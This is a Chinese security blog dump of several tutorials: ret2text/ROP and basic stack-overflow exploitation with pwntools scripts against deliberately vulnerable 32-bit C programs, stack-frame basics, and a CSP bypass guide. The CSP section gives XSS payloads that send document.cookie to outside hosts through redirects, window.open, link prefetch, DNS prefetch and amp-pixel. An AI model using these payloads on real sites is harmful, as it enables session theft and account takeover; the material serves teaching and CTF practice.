可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ROP要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。 下面看下单个Gadget和多个Gadgets进行溢出的原理示例。 单个Gadget溢出示例其payload是如下形式，使用padding溢出到返回地址前，再将gadget地址传到返回地址处： payload : padding + address of gadget 多个Gadgets溢出示例如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（EIP）才能得到切换，所以这种技术被称为返回导向编程( Return Oriented Programming )。要执行多个 gadget，溢出数据应该以下面的方式构造： payload : padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n 在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 EIP，程序继续跳转执行 gadget 2，以此类推。 ……（待补充） ret2textret2text即控制程序执行程序本身已有的的代码 (.text)。也就是说，在该ELF的.text代码段中是存在可以利用的代码的，如存在system(“/bin/sh”)的代码。 下面按照一般的做题步骤做下吧。 一、运行程序，了解执行流程运行程序，输入内容后即返回： 二、file查看elf文件是否动态链接可用看到是32位ELF文件，且是动态链接的，即可能与libc相关： 三、checksec查看保护机制查看一下程序的保护机制，可以看到是32位的程序且仅仅开启了栈不可执行保护NX： 四、使用IDA进行静态汇编代码分析IDA打开查看，可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞，且可看到变量v4相对于ESP和EBP寄存器的偏移： 由于NX启动了即栈不可执行，我们可以到其他的地方查看，打开shift+F12打开string窗口，可用看到“/bin/sh/”字符串： 双击点击进去，发现是在secure函数中调用的： 点击后面的secure，进入secure函数发现了存在直接调用system(“/bin/sh”)的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到shell了： 现在已经明确了可利用的Gadget地址，即反弹shell的地址：0x0804863A。 五、计算偏移地址构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。 Method 1——GDB断点调试获取先查看一下gets()函数的汇编代码，得知该字符串是通过相对于ESP的索引（具体如何判断可看后面的调试）： 可知gets()函数地址为0x080486AE，在该处设置断点进行调试： ESP为ffffcfa0，其中存放的内容为ffffcfbc，即输入的内容s的地址为ESP+1c= ffffcfbc，而EBP为ffffd028，则s到EBP的偏移为|ffffd028- ffffcfbc|=6c，所以s相对与返回地址的偏移为0x6c+4=0x70。 确认一遍，在gets()函数的下一条汇编指令处打断点，继续运行并输入一大串1： 可以发现EAX地址处确实保存的是s（数据换成1），且|EAX-ESP|=|0xffffcfbc-0xffffcfa0|=1c，即说明s是相对于ESP偏移的；但|EAX-EBP|=|0xffffcfbc-0xffffd028|=6c，和IDA给出的64h有差别，由此可知IDA给出的相对于ESP的偏移是正确的、但相对于EBP的偏移是有误差的，这就是之前说的IDA分析给出的偏移量并不那么可信。 Method2——使用GDB pattern字符串溢出计算偏移量GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可： pattern_offset算出偏移量： 得出s与函数返回地址的偏移为112即0x70。 六、编写payload由前面分析知，可以利用.text代码段区域中的system(“/bin/sh”)代码，该代码段即为可被ROP利用的Gadget，地址为0x0804863a，将其覆盖到函数返回地址处，前面再padding 70h个字节码即可： 1234567from pwn import *sh = process(\"./ret2text\")binsh_addr = 0x0804863apayload = flat([\"A\" * 0x70, binsh_addr])sh.sendline(payload)sh.interactive() 运行后，成功getshell： 参考基本 ROP 手把手教你栈溢出从入门到放弃（下）","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"栈溢出基本原理","date":"2019-03-03T02:21:25.000Z","path":"2019/03/03/栈溢出基本原理/","text":"0x01 栈溢出基本原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是： 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 EIP，所以栈溢出利用就是让 EIP载入攻击指令的地址。 1、函数调用结束时先来看看函数调用结束时，如果要让 EIP指向攻击指令，需要哪些准备。 首先，在Pop过程中，返回地址会被传给 EIP，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。 2、函数调用开始时再来看看函数调用开始时，如果要让 EIP指向攻击指令，需要哪些准备。 这时，EIP会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制了，不过我们可以“偷梁换柱”——将原本指定的函数在调用时替换为其他函数。 0x02 Demo编写一段简单的调用gets()函数代码，主要目的读取一个字符串，并将其输出，可明显知道是存在栈溢出漏洞的，我们可以控制程序执行pwn()函数实现栈溢出效果测试： 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void pwn() &#123; puts(\"Stack Overflow! Hacked By Mi1k7ea.\"); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 编译该c文件：gcc -m32 -fno-stack-protector stack_test.c -o stack_test。 gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有--enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie。 可以看出，gcc警告说gets()是一个危险函数，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，导致栈溢出漏洞存在。 下面就来简单描述一下栈溢出攻击利用的步骤吧。 1、运行程序，了解功能程序功能很简单，输入什么输出什么： 2、file查看elf文件是否动态链接可以看到，该ELF文件是动态链接的： 为什么要多做这可能没用的一步呢？因为后面会让我们提前知道这题到底会不会设计到libc相关的内容，若为静态文件则无需这方面的考虑。 3、checksec检查安全编译选项可以看到，只开启了NX，和GCC编译时的选项是一致的： 4、使用IDA进行静态汇编代码分析使用IDA打开该ELF文件，F5，点击vulnerable()函数，关注到其中的gets()函数是存在栈溢出漏洞的，而它的s参数在其上方定义了，关注到IDA给出变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h： 由此知道，gets()导致存在栈溢出漏洞，而其参数s距离EBP的偏移地址为14h。 同时，点击查看我们需要溢出至调用的目标函数pwn()，记下它的地址0x0804843B： 5、计算偏移地址构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。这里为计算变量s距离main()函数的返回地址的字节数。 由函数调用栈可知，要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数，都是先通过计算出能够控制的内存的起始地址距离EBP的字节数，再加上4即可，看下图便一目了然： 其实由第四步的IDA分析可以知道，参数s距离EBP的偏移地址为14h。 但是有时候并不能完全相信IDA计算出来的偏移，最为准确的是用GDB打断点调试出来，下面介绍两种GDB方法。 （1）GDB断点调试获取先用IDA查看gets()函数的地址，获取到其地址为0x08048461： 在GDB中在该地址打下断点并运行，看到程序在调用gets()函数前停下，这时看到EBP为0xffffd028、ESP为0xffffd000： 由前面可知，变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h，这里只看其距离EBP的距离，计算出s的地址为0xffffd028-14h=0xffffd014。 为了验证一下本次IDA计算出的偏移值是否准确，我们接着在gets()函数的下一条指令地址处即0x08048466中打下断点，再c继续往下运行，要求输入字符串，这里输入“hello”之后程序就停止在断点处： 可以看到，存放“hello”的内存地址即s的地址为0xffffd014，且ESP下一次会指向该地址。该地址和使用IDA给出的偏移量计算出来的结果一致，即这次的IDA计算结果可信。 由此可知，s的地址为0xffffd014，则s距离EBP偏移量为14h，则s与函数返回地址的偏移为14h+4=18h。 （2）使用GDB pattern字符串溢出计算偏移量GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可： 记下此刻的EIP值，即0x44414128或字符“(AAD”，再输入pattern_offset中计算出偏移值： 得出s与函数返回地址的偏移为24，即18h=14h+4。 6、编写payload在下面payload中，前面14h个字节码用“a”覆盖，将EBP覆盖为“bbbb”，最后插入小端存储形式的pwn()函数地址： 12345678from pwn import *sh = process(\"./stack_test\")pwn_addr = 0x0804843Bpayload = flat([\"a\" * 0x14, \"bbbb\", p32(pwn_addr)])# payload = flat([\"a\" * 0x14, p32(1), p32(pwn_addr)])sh.sendline(payload)print sh.recvall() 运行payload，直接栈溢出执行了pwn()函数： 整个栈溢出的漏洞发现及利用过程大致如此，当然还有其他的一些技巧这里还未涉及。 0x03 栈溢出步骤小结Demo是具体细化的步骤，总体而言主要分为两个步骤，先是找到危险函数确定存在栈溢出漏洞，然后就是通过调试分析计算出栈溢出攻击利用需要溢出的偏移量，最后就可以顺利地写exp进行利用。 寻找危险函数通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下 输入 gets，直接读取一行，忽略’\\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\\x00’停止 strcat，字符串拼接，遇到’\\x00’停止 bcopy 确定填充长度这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式： 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求： 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 0x04 参考栈溢出原理 手把手教你栈溢出从入门到放弃（上）","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"栈基础","date":"2019-03-03T01:13:09.000Z","path":"2019/03/03/栈及栈帧/","text":"栈栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，两者都是对栈顶的操作。 每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。 程序的栈是从进程地址空间的高地址向低地址增长的，即从栈顶处增长。 栈帧栈帧（Stack Frame）是利用EBP寄存器访问栈内局部变量、参数、函数返回地址等的手段，在程序中用于声明局部变量、调用函数等。 整个过程为：调用某函数时，先把用作基准点（函数起始地址）的ESP值保存到EBP并维持在函数内部。无论ESP的值如何变化，以EBP的值为基准能够准确安全访问到相关函数的局部变量、参数、返回地址等。 基本的栈帧结构如下： 123456PUSH EBPMOV EBP,ESP...MOV ESP,EBPPOP EBPRETN 具体的可参考之前的博文：栈帧 函数调用栈 函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。 函数调用发生和结束时调用栈的变化如图： 函数状态主要涉及三个寄存器——ESP，EBP，EIP。ESP用来在Push和Pop时存储函数调用栈的栈顶地址。EBP用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置，即栈帧作用。EIP用来存储即将执行的程序指令的地址，CPU依照 EIP的存储内容读取指令并执行，EIP随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。 函数调用开始时的栈变化下面让我们来看看发生函数调用开始时，栈顶函数状态以及上述寄存器的变化。 变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。 1、逆序Push被调函数的参数入栈首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存，如下图（注意一点就是，和开始的图的地址高低位方向不一样，现在是上面是高位下面是低位）： 2、Push调用函数的下一条指令的地址入栈然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存： 3、Push EBP构建栈帧再将当前的EBP寄存器的值（也就是调用函数的基地址）压入栈内，并将 EBP寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 EBP（基地址）信息得以保存。同时，EBP被更新为被调用函数（callee）的基地址： 4、Push被调函数的局部变量等数据入栈再之后是将被调用函数（callee）的局部变量等数据压入栈内： 在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。 函数调用结束时的栈变化看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。 变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。 1、Pop被调函数局部变量等数据出栈首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。 2、通过栈帧恢复调用函数基地址然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 EBP寄存器内。这样调用函数（caller）的 EBP（基地址）信息得以恢复。此时栈顶会指向返回地址。 3、Pop调用函数下一条指令的地址到栈顶再将返回地址从栈内弹出，并存到 EIP寄存器内。这样调用函数（caller）的 EIP（指令）信息得以恢复。 至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了，中间的被调函数的参数会直接被略过而返回到调用函数的指令中继续执行。 函数调用约定可参考之前的博文：函数调用约定 另外推荐两个学习函数调用栈的详细的教程： C 语言函数调用栈 (一) C 语言函数调用栈 (二) 参考栈介绍 手把手教你栈溢出从入门到放弃（上）","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"}]},{"title":"CSP策略及绕过技巧小结","date":"2019-02-24T05:47:07.000Z","path":"2019/02/24/CSP策略及绕过技巧小结/","text":"0x01 何为CSPCSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 0x02 CSP语法CSP中常见的header字段为Content-Security-Policy。 一个CSP头由多组CSP策略组成，中间由分号分隔，如下： 1Content-Security-Policy: default-src &apos;self&apos; www.baidu.com; script-src &apos;unsafe-inline&apos; 其中每一组策略包含一个策略指令和一个内容源列表。 策略指令default-srcdefault-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。 script-srcscript-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。 对于这个属性有个特殊的配置叫unsafe-eval，它会允许下面几个函数： 1`eval()Function()setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.` style-srcstyle-src定义了页面中CSS样式的有效来源，包括下面三种引用的css属性，style也有个‘unsafe-inline’这个参数，同理会允许所有的内联css。 1、第一种是通过link标签加载的css，类似于&lt;link href=&quot;001.css&quot; type=&quot;text/css&quot; rel=&quot;Stylesheet&quot;/&gt; 2、当然还有style标签 123&lt;style type=\"text/css\"&gt;.main&#123; width:1002px; margin:0 auto;&#125;&lt;/style&gt; 3、还有通过@import引入的样式表 1234&lt; STYLE TYPE=\"text/css\"&gt; @import \"example.css\"; @import \"style/other.css\"; &lt; /STYLE&gt; 4、内联样式表，类似于style=&quot;font-size:10px;font-color:#ff0000&quot; img-srcimg-src定义了页面中图片和图标的有效来源。 font-srcfont-src定义了字体加载的有效来源。 connect-srcconnect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。如下例子： 1`&lt;a ping=\"https://not-example.com\"&gt;...&lt;script&gt; var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://not-example.com/'); xhr.send(); var ws = new WebSocket(\"https://not-example.com/\"); var es = new EventSource(\"https://not-example.com/\"); navigator.sendBeacon(\"https://not-example.com/\", &#123; ... &#125;);&lt;/script&gt;` child-srcchild-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。 会匹配iframe和frame标签，如下： 1234567首先设置cspContent-Security-Policy: child-src https://example.com/而下面的请求会被CSP拦截&lt;iframe src=\"https://not-example.com\"&gt;&lt;/iframe&gt;&lt;script&gt; var blockedWorker = new Worker(\"data:application/javascript,...\");&lt;/script&gt; manifest-srcmanifest-src指令限制了从应用清单可以加载的url。 这个属性不太熟，比较常见的就是link： 1234举个例子：Content-Security-Policy: manifest-src https://example.com/下面的请求会返回错误:&lt;link rel=\"manifest\" href=\"https://not-example.com/manifest\"&gt; 内容源内容源有三种：源列表、关键字和数据。 源列表源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘*‘)，端口号也可以使用通配符 (同样是 ‘*‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。 有效的主机表达式包括： http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。） mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。） https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。） 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。 关键字 ‘none’代表空集；即不匹配任何 URL。两侧单引号是必须的。 ‘self’代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。 ‘unsafe-inline’允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。 ‘unsafe-eval’允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。 数据 data: 允许data: URI作为内容来源。 mediastream: 允许mediastream: URI作为内容来源。 1Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream: 0x03 CSP绕过绕过场景其实是很多的，这里慢慢来收集吧，主要是先收集一些广泛公开的和CTF中遇到的吧。 1、绕过default-src ‘none’策略为：Content-Security-Policy: default-src ‘none’; 这种情况下，可以使用meta标签实现跳转： 1&lt;meta http-equiv=\"refresh\" content=\"1;url=https://www.mi1k7ea.com/x.php?c=[cookie]\" &gt; Demo如下： 12345678910111213141516171819202122&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; 当我们输入如下内容可以成功跳转至目标页面，当然也可以将cookie带出来： 1&lt;meta http-equiv=\"refresh\" content=\"1;url=http://192.168.43.201:8000/x.php?c=mi1k7ea\" &gt; 2、形同虚设的script-src ‘unsafe-inline’策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。 123&lt;script&gt;window.location=\"https://www.mi1k7ea.com/x.php?c=[cookie]\";&lt;/script&gt;&lt;script&gt;window.open('//www.mi1k7ea.com/?'+escape(document.cookie))&lt;/script&gt;&lt;script&gt;window.location.href='https://www.mi1k7ea.com/?cookie='+document.cookie&lt;/script&gt; Demo代码还是之前的，把CSP修改一下，添加script-src ‘unsafe-inline’;即可。 输入如下标签直接跳转并成功返回cookie： 1&lt;script&gt;window.location.href='http://192.168.43.201:8000/?cookie='+document.cookie&lt;/script&gt; 内嵌script都可以执行，当然可以直接执行本页面的JS，如输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;即可，这里的利用和XSS利用一致，没有啥绕过技巧，不再累赘。 3、绕过xx-src **号即允许匹配任何URL请求。但一般情况很少会遇到default-src ;或大部分xx-src ;这样的CSP策略，举一个简单的例子： 1Content-Security-Policy: default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src *; script-src http://xxxxx/js/ &apos;nonce-xxx&apos;;font-src http://xxxx/fonts/ fonts.gstatic.com; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src &apos;self&apos; 很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。 可以利用CSRF漏洞。这里直接输入&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;来测试： 当然，iframe也可以内嵌外部弹框的JS： 查看页面元素，可以看到iframe内嵌包含进来的是&lt;script&gt;alert(1)&lt;/script&gt;，其可以正常执行而无视掉script-src http://xxxxx/js/ &#39;nonce-xxx&#39;;的CSP策略。 4、利用link绕过xx-src selfCSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。 在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）： 1&lt;link rel=\"prefetch\" href=\"https://www.mi1k7ea.com/c.php?c=[cookie]\"&gt; 在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie： 1&lt;link rel=\"dns-prefetch\" href=\"//[cookie].mi1k7ea.com\"&gt; 在后面的iframe中会有结合利用的示例。 5、利用浏览器补全绕过script nonce有时候CSP策略可能会设置成如下： 1Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-xxx&apos; 这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。 如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如： 12&lt;p&gt;插入点&lt;/p&gt;&lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt; 可以插入如下内容来利用浏览器补全功能： 1&lt;script src=\"http://192.168.248.1/a.js\" a=\" 最终形成如下页面结构： 12&lt;p&gt;&lt;script src=\"http://192.168.248.1/a.js\" a=\"&lt;/p&gt;&lt;script id=\"aa\" nonce=\"xxx\"&gt;document.write('CSP');&lt;/script&gt; 也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。 还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。 Demo 1234567891011121314151617181920212223&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;script type=&quot;text/javascript&quot; nonce=&lt;?php echo $nonce;?&gt;&gt;document.write(&quot;Mi1k7ea&quot;)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当我们输入&lt;script src=&quot;http://192.168.43.201/a.js&quot; a=&quot;时即会弹框： 查看元素，看到输入的script标签的a属性的双引号将后面含有nonce的script标签第一个含有双引号的属性都给闭合了，成功劫持了nonce属性进而加载外部JS弹框： 值得注意的就是，要想成功利用在nonce属性前需要存在一个用引号括起来的属性，不然会失效。 另外，在之前做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：一道绕过CSP的XSS题目 6、利用Gadgets和strict-dynamic/unsafe-eval绕过即重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的ppt，上面总结了可以被用来绕过CSP的一些JS库。 例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP： 1&lt;div data-role=popup id='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;/div&gt; 在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie： 1&lt;amp-pixel src=\"http://your domain/?cid=CLIENT_ID(FLAG)\"&gt;&lt;/amp-pixel&gt; 在做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：一道绕过CSP的XSS题目 7、利用iframe绕过（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：1&lt;iframe src=\"B\"&gt;&lt;/iframe&gt; 下面简单地搞个示例。 1.php代码，有CSP限制，但可以通过iframe加载同源的页面： 12345678910111213141516171819202122&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; frame-src &apos;self&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; 2.php简单写为&lt;script&gt;alert(&#39;Mi1k7ea&#39;)&lt;/script&gt;。 在访问1.php时，直接输入script标签是无法执行弹框的，但可以通过iframe引入同源的2.php来执行该页面的JS代码，输入&lt;iframe src=&#39;http://127.0.0.1/2.php&#39;&gt;&lt;/iframe&gt;： （2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：1&lt;iframe csp=\"script-src 'unsafe-inline'\" src=\"http://xxx\"&gt;&lt;/iframe&gt; （3）绕过sandbox：情景1——未开启X-Frame-Options:DENY Demo代码如下： 123456789101112&lt;?php header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups&quot;); setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;&lt;/body&gt; 当CSP设置为allow-popups开启时，window.open等就可以打开新的窗口，这时直接就能利用了，直接输入如下内容就能顺利地带出cookie信息（在URL栏输入前记得先进行URL编码）： 123?xss=window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie))或?xss=window.location.href=&apos;http://xxx.ceye.io/?cookie=&apos;+document.cookie 这里加载同源的js文件是没有问题的，其中a.js的代码为alert(1)，构造如下：： 1xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1/a.js&quot;;document.body.appendChild(f); 